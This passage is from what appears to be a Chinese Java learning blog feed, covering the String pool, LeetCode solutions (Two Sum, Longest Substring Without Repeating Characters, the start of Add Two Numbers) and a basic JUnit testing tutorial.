<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo02StringPool</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String str1 = <span class="hljs-string">"abc"</span>;<br>        String str2 = <span class="hljs-string">"abc"</span>;<br><br>        <span class="hljs-keyword">char</span>[] charArray = &#123; <span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span> &#125;;<br>        String str3 = <span class="hljs-keyword">new</span> String(charArray);<br><br>        System.out.println(str1 == str2);   <span class="hljs-comment">//true</span><br>        System.out.println(str2 == str3);   <span class="hljs-comment">//false</span><br>        System.out.println(str2 == str3);   <span class="hljs-comment">//false</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">true</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">false</span><br></code></pre></div></td></tr></table></figure>

<h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><p>前面，我们在实现比较的时候，发现，对于引用类型，使用 <code>==</code> 是进行[地址值]的比较，而不是我们想要的字符串内容的比较。。。<br>而通过转化成数组一个一个比较，太费力了。<br>这是java中提供了可以实现String比较的方法，</p>
]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-01_TwoSum</title>
    <url>/article/5f1ba731.html</url>
    <content><![CDATA[<p>LeetCode可以说是我们程序员练习算法非常好的一个平台，借鉴大佬的文章，我在这也写下自己的学习记录，争取能够做到一千道。</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><font color="#856363" size="4" face="Open Sans">Given an array of integers, return indices of the two numbers such that they add up to a specific target.</font></p>
<p><font color="#856363" size="4" face="Open Sans">You may assume that each input would have exactly one solution, and you may not use the same element twice.</font></p>
<a id="more"></a>
<hr>
<font size="4" face="Open Sans"><b>Example</b></font>


<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs code">Given nums &#x3D; [2, 7, 11, 15], target &#x3D; 9,<br><br>Because nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9,<br>return [0, 1]<br></code></pre></div></td></tr></table></figure>

<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p><font size="4" face="Open Sans">在数组中找到2个数之和等于给定值的数字，结果返回2个数字在数组中的下标。</font></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="方法一：暴力枚举"><a href="#方法一：暴力枚举" class="headerlink" title="方法一：暴力枚举"></a>方法一：暴力枚举</h3><p><font size="4" face="Open Sans">最先想到的应该就是暴力枚举数组中的每一个数，寻找数组中是否存在 <code>tager-x</code> 。我也只想到了这种方法。<br>这种方法需要注意，寻找 <code>target-x</code> 时，同一x不能够重复使用，也就意味着: 如果 <code>x = target - x</code> ,那么我们不能返回同一个下标。解决方法是需要我们去匹配x后面的值</font></p>
<p><font size="4" face="Open Sans"><b>代码</b></font></p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D01_TwoSum</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] twoSum_01(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target) &#123;<br>        <span class="hljs-keyword">int</span> n = nums.length;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (nums[i] + nums[j] == target)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;i, j&#125;;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>
<hr>
<font size="4" face="Open Sans"><b>复杂度分析</b></font>

<p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans">O(N²)</font><font size="4" face="Open Sans"> ,其中N是数组中的元素数量。最坏的情况下数组中任意两个数都要被匹配一次。</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans">O(1)</font><font size="4" face="Open Sans">。</font></p>
<h3 id="方法二：哈希表"><a href="#方法二：哈希表" class="headerlink" title="方法二：哈希表"></a>方法二：哈希表</h3><p><font size="4" face="Open Sans">这个是我没有想到的，hash表我确实只是知道它的基本性质，但是拿来用的话，确实没有想到。方法一的时间复杂度比较高，如果处理比较多的数据时，效率就不高了。<br>当使用哈希表时，可以将寻找 <code>target - x</code> 的时间复杂度从O(N)降到O(1)。<br>这样我们创建一个哈希表，对于每一个 <code>x</code> ，首先我们查询哈希表中是否存在 <code>target - x</code> ,然后将 <code>x</code> 插入到哈希表中，即可保证不会让 <code>x</code> 和自己匹配。</font></p>
<!-- <font size="4" face="Open Sans"><b>代码</b></font> -->

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D01_TwoSum</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] twoSum_01(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target) &#123;<br>        <span class="hljs-keyword">int</span> n = nums.length;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (nums[i] + nums[j] == target)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;i, j&#125;;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] twoSum_02(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target) &#123;<br>        Map&lt;Integer, Integer&gt; hashtable = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (hashtable.containsKey(target-nums[i]))<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;hashtable.get(target-nums[i]), i&#125;;<br>            hashtable.put(nums[i], i);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>
<!-- <font size="4" face="Open Sans"><b>复杂度分析</b></font> -->

<h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans">O(N)</font><font size="4" face="Open Sans"> ,其中N是数组中的元素数量。对于每一个<code>x</code>,我们可以O(1)的寻找<code>target - x</code></font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans">O(N)</font><font size="4" face="Open Sans"> ,其中N是数组中的元素数量，用于哈希表的开销。</font></p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Junit单元测试</title>
    <url>/article/411de67e.html</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote>
    JUnit 是一个 Java 编程语言的单元测试框架。JUnit 在测试驱动的开发方面有很重要的发展，是起源于 JUnit 的一个统称为 xUnit 的单元测试框架之一。
</blockquote>


<h3 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h3><ol type="1" start="1">
    <li>可以书写一系列的测试方法，对项目所有的接口或者方法进行单元测试。</li>
    <li>启动后，自动化测试，并判断执行结果, 不需要人为的干预。</li>
    <li>只需要查看最后结果，就知道整个项目的方法接口是否通畅。</li>
    <li>每个单元测试用例相对独立，由Junit 启动，自动调用。不需要添加额外的调用语句。</li>
    <li>添加，删除，屏蔽测试方法，不影响其他的测试方法。 开源框架都对JUnit 有相应的支持。</li>
</ol>


<h3 id="测试分类"><a href="#测试分类" class="headerlink" title="测试分类"></a>测试分类</h3><p><font color="#856363" size="4" face="Open Sans"><b></p>
<ol type="1" start="1">
    <li>黑盒测试：不需要写代码，给输入的只，看程序是否能够输出期望的值。</li>
    <li>白盒测试：需要写代码的。关注程序具体的执行流程。</li>
</ol>

<p>这里我们所说的Junit就是白盒测试。</b><br></font></p>
<h3 id="Junit使用"><a href="#Junit使用" class="headerlink" title="Junit使用"></a>Junit使用</h3><h4 id="定义测试类"><a href="#定义测试类" class="headerlink" title="定义测试类"></a>定义测试类</h4><p>定义一个测试类(测试用例)<br>建议：<br></p>
<li>
    测试类名：被测试的类名Test        CalulatorTest
</li><li>
    包名：xxx.xxx.xx.test            com.fxhstudy.test
</li>

<h4 id="定义测试方法"><a href="#定义测试方法" class="headerlink" title="定义测试方法"></a>定义测试方法</h4><p>定义测试的方法：可以独立运行<br>建议：<br></p>
<li>
    方法名：test测试的方法名        testAdd()
</li>
<li>
    返回值：void
</li>
<li>
    参数列表：空参
</li>


<h4 id="给方法加-Test"><a href="#给方法加-Test" class="headerlink" title="给方法加@Test"></a>给方法加@Test</h4><p>当我们加入@Test注解时，会报错，直接Alt+Enter,会自动给你添加Junit测试类包</p>
<h3 id="判定结果"><a href="#判定结果" class="headerlink" title="判定结果"></a>判定结果</h3><li>
    红色：失败
</li>
<li>
    绿色：成功
</li>
<li>
    一般我们会使用断言操作来处理结果
</li>
<br>

<p><code>Assert.assertEquals(期望的结果,运算的结果);</code></p>
<h3 id="如何操作"><a href="#如何操作" class="headerlink" title="如何操作"></a>如何操作</h3><p>这里我在<code>junit</code>文件夹下创建了<code>Calculator</code>,其中写了<code>add</code>和<code>sub</code>测试方法</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fxhstudy.junit;<br><br><span class="hljs-comment">/**<br> * 计算器类<br> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Calculator</span> </span>&#123;<br><br>    <span class="hljs-comment">/**<br>     * 加法<br>     * <span class="hljs-doctag">@param</span> a<br>     * <span class="hljs-doctag">@param</span> b<br>     * <span class="hljs-doctag">@return</span><br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> a + b;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> a - b;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>在test文件夹下面创建了<code>CalculatorTest</code>测试类</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fxhstudy.test;<br><br><span class="hljs-keyword">import</span> com.fxhstudy.junit.Calculator;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CalculatorTest</span> </span>&#123;<br><br>    <span class="hljs-comment">/**<br>     * 测试add方法<br>     */</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-comment">//        System.out.println("test被执行了");</span><br>        <span class="hljs-comment">//1. 创建计算机对象</span><br>        Calculator c = <span class="hljs-keyword">new</span> Calculator();<br>        <span class="hljs-comment">//2. 调用add方法</span><br>        <span class="hljs-keyword">int</span> result = c.add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p><img src="https://qiniuyun.fxhstudy.com/Junit%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%951.png" srcset="/img/loading.gif"><br></p>
<p>如图则表示我们的没有异常，注意，没有异常是代表程序在系统运行中是没有问题，并不表示你的代码和你所预期的一样。<br>如何想测试和你所预期是否一致，我们需要用到断言，下面会介绍断言。</p>
<p>接着，我们将<code>Calculator</code>中的测试方法添加异常</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fxhstudy.junit;<br><br><span class="hljs-comment">/**<br> * 计算器类<br> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Calculator</span> </span>&#123;<br><br>    <span class="hljs-comment">/**<br>     * 加法<br>     * <span class="hljs-doctag">@param</span> a<br>     * <span class="hljs-doctag">@param</span> b<br>     * <span class="hljs-doctag">@return</span><br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">3</span> / <span class="hljs-number">0</span>;	<span class="hljs-comment">//这里会报异常</span><br>        <span class="hljs-keyword">return</span> a + b;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> a - b;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>再用测试类测试时，会出现这样的错误</p>
<p><img src="https://qiniuyun.fxhstudy.com/Junit%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%952.png" srcset="/img/loading.gif"><br></p>
<p>这里就是因为测试的方法出现了错误异常，但是你在写程序时，编译器是不会爆红的。</p>
<p>接着我们使用断言操作来处理结果</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fxhstudy.test;<br><br><span class="hljs-keyword">import</span> com.fxhstudy.junit.Calculator;<br><span class="hljs-keyword">import</span> org.junit.Assert;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CalculatorTest</span> </span>&#123;<br><br>    <span class="hljs-comment">/**<br>     * 测试add方法<br>     */</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-comment">//        System.out.println("test被执行了");</span><br>        <span class="hljs-comment">//1. 创建计算机对象</span><br>        Calculator c = <span class="hljs-keyword">new</span> Calculator();<br>        <span class="hljs-comment">//2. 调用add方法</span><br>        <span class="hljs-keyword">int</span> result = c.add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//3. 断言 我断言这个结果是3</span><br>        Assert.assertEquals(<span class="hljs-number">3</span>, result);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>测试成功，没有异常</p>
<p><img src="https://qiniuyun.fxhstudy.com/Junit%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%953.png" srcset="/img/loading.gif"><br></p>
<p>接着我们再将断言结果改为-1</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//3. 断言 我断言这个结果是-1</span><br>        Assert.assertEquals(-<span class="hljs-number">1</span>, result);<br></code></pre></div></td></tr></table></figure>

<p>此时出现了异常</p>
<p><img src="https://qiniuyun.fxhstudy.com/Junit%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%954.png" srcset="/img/loading.gif"><br></p>
<p>以上就是关于Junit的一些基本测试方法。</p>
]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-03-LengthOfLongestSubstring</title>
    <url>/article/bbf075d9.html</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><font color="#856363" size="4" face="Open Sans">Given a string, find the length of the longest substring without repeating characters.</font></p>
<a id="more"></a>

<hr>
<font size="4" face="Open Sans"><b>Example1</b></font>

<figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">Input: <span class="hljs-string">"abcabcbb"</span><br>Output: <span class="hljs-number">3</span><br>Explanation: The answer <span class="hljs-keyword">is</span> <span class="hljs-string">"abc"</span>, <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">length</span> <span class="hljs-keyword">of</span> <span class="hljs-number">3.</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example2</b></font></p>
<figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">Input: <span class="hljs-string">"bbbbb"</span><br>Output: <span class="hljs-number">1</span><br>Explanation: The answer <span class="hljs-keyword">is</span> <span class="hljs-string">"b"</span>, <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">length</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1.</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example3</b></font></p>
<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">Input: <span class="hljs-string">"pwwkew"</span><br>Output: 3<br>Explanation: The answer is <span class="hljs-string">"wke"</span>, with the length of 3.<span class="hljs-built_in"><br>Note </span>that the answer must be a substring, <span class="hljs-string">"pwke"</span> is a subsequence<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> a substring.<br></code></pre></div></td></tr></table></figure>

<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p><font size="4" face="Open Sans">在一个字符串重寻找没有重复字母的最长子串。</font></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p><font size="4" face="Open Sans">这一题所用的思想是”滑动思想”,看了解析，和后面的第3,76,438,567题类似</font></p>
<h3 id="滑动思想原理"><a href="#滑动思想原理" class="headerlink" title="滑动思想原理"></a>滑动思想原理</h3><p><font size="4" face="Open Sans">滑动窗口的右边界不断的右移，只要没有重复的字符，就持续向右扩大窗口边界。一旦出现了重复字符，就需要缩小左边界，直到重复的字符移出了左边界，然后继续移动滑动窗口的右边界。以此类推，每次移动需要计算当前长度，并判断是否需要更新最大长度，最终最大的值就是题目中的所求。</font></p>
<h4 id="代码一"><a href="#代码一" class="headerlink" title="代码一"></a>代码一</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D03_LengthOfLongestSubstring</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">lengthOfLongestSubstring</span><span class="hljs-params">(String s)</span> </span>&#123;<br>        Map&lt;Character, Integer&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        <span class="hljs-keyword">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> end = <span class="hljs-number">0</span>, start = <span class="hljs-number">0</span>; end &lt; s.length(); end++) &#123;<br>            <span class="hljs-keyword">char</span> alpha = s.charAt(end);<br>            <span class="hljs-keyword">if</span> (hashMap.containsKey(alpha)) &#123;<br>                start = Math.max(hashMap.get(alpha), start);<br>            &#125;<br>            ans = Math.max(ans, end - start + <span class="hljs-number">1</span>);<br>            hashMap.put(s.charAt(end), end + <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>


<h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(N)</b></font><font size="4" face="Open Sans">,其中N是字符串长度。</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(N)</b></font><font size="4" face="Open Sans">。</font></p>
<h4 id="代码二"><a href="#代码二" class="headerlink" title="代码二"></a>代码二</h4>]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-02-AddTwoNumbers</title>
    <url>/article/538c4120.html</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><font color="#856363" size="4" face="Open Sans">You are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order and each of their nodes contain a single digit. Add the two numbers and return it as a linked list.</font></p>
<p><font color="#856363" size="4" face="Open Sans">You may assume the two numbers do not contain any leading zero, except the number 0 itself.</font></p>
<a id="more"></a>

<hr>
<font size="4" face="Open Sans"><b>Example</b></font>

<figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-string">(2</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">3</span><span class="hljs-string">)</span> <span class="hljs-string">+</span> <span class="hljs-string">(5</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">6</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span><span class="hljs-string">)</span><br><span class="hljs-attr">Output:</span> <span class="hljs-number">7</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">0</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">8</span><br><span class="hljs-attr">Explanation:</span> <span class="hljs-number">342</span> <span class="hljs-string">+</span> <span class="hljs-number">465</span> <span class="hljs-string">=</span> <span class="hljs-number">807</span><br></code></pre></div></td></tr></table></figure>

